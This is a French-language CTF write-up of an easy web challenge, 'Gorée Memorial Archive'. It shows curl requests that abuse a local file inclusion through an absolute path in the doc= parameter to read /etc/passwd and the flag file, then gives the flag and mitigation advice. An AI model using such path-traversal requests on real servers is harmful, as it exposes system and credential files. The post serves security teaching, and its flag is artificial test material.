---
layout: post
title: "ECOWAS CTF 2026 — Gorée Memorial Archive [Web/LFI]"
date: 2026-04-24 09:10:00 +0000
categories: [CTF, ECOWAS-CTF-2026]
tags: [web, lfi, path-traversal, curl, burpsuite, absolute-path]
toc: true
---

> **CTF :** ECOWAS CTF 2026 · **Catégorie :** Web · **Difficulté :** ⭐ (Easy) · **Points :** 100  
> **[← Retour à l'index du CTF](/portfolio/blog/posts/ecowas-ctf-2026/)**

---

> **Writeup par : 0xWhoAm1** — Équipe **DarkPulse**

---

## Description du challenge

Un service web exposé sur le port 5005. La page d'accueil présente une archive mémorielle de l'île de Gorée — site historique du Sénégal lié au commerce d'esclaves.

![Challenge Gorée Memorial Archive](/assets/img/ecowas-2026/lion/goree-challenge.png)

---

## Reconnaissance initiale

On commence par une requête simple pour voir ce que le serveur expose :

```bash
curl -i http://labs.ecowasctf.com.gh:5005/
```

Réponse HTML reçue :

```html
<h1>Gorée Memorial Archive</h1>
<p>A small public reader for archival material on the island of Gorée.</p>
<p>View this: <a href="/read?doc=welcome.md">welcome.md</a>.</p>
```

**Observation immédiate :** l'endpoint `/read?doc=welcome.md` accepte un nom de fichier en paramètre. C'est un signal fort d'une potentielle **LFI (Local File Inclusion)**.

---

## Énumération des endpoints

On utilise **Burp Suite** pour explorer les endpoints disponibles :

```bash
# Endpoints testés
/read      ← paramètre doc= contrôlable
/robots.txt
```

`robots.txt` ne donne rien de concret. On se concentre sur `/read`.

---

## Exploitation — LFI par chemin absolu

### Test 1 : lecture de `/etc/passwd`

```bash
curl "http://labs.ecowasctf.com.gh:5005/read?doc=/etc/passwd"
```

Le contenu de `/etc/passwd` s'affiche directement dans la réponse :

![/etc/passwd via LFI](/assets/img/ecowas-2026/lion/goree-lfi-passwd.png)

**Analyse :** Le serveur ne filtre pas les chemins absolus. Quand on passe `/etc/passwd` au lieu de `welcome.md`, il lit le fichier depuis la racine du système — c'est une **LFI via absolute path** (aucun `../` nécessaire ici).

> **LFI (Local File Inclusion)** : vulnérabilité où une application lit un fichier dont le chemin est partiellement contrôlé par l'utilisateur. Voir [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).

### Test 2 : lecture du flag

```bash
curl "http://labs.ecowasctf.com.gh:5005/read?doc=/flag.txt"
```

![Flag via LFI](/assets/img/ecowas-2026/lion/goree-lfi-flag.png)

---

## Flag

```
EcowasCTF{g0r33_abs0lut3_path_j01n_lf1}
```

---

## Leçons apprises

| Vecteur | Cause | Prévention |
|---------|-------|------------|
| LFI absolute path | Aucun sanitize du paramètre `doc` | Utiliser une allowlist de noms de fichiers |
| Sans `../` | Le serveur fait `open(param)` directement | N'exposer jamais un chemin utilisateur à `open()` |

Le challenge montre que la LFI la plus simple n'a pas besoin de `../` si le serveur utilise directement le paramètre comme chemin absolu. Une défense correcte valide que le fichier appartient à un répertoire autorisé (`os.path.realpath()` + vérification de préfixe).
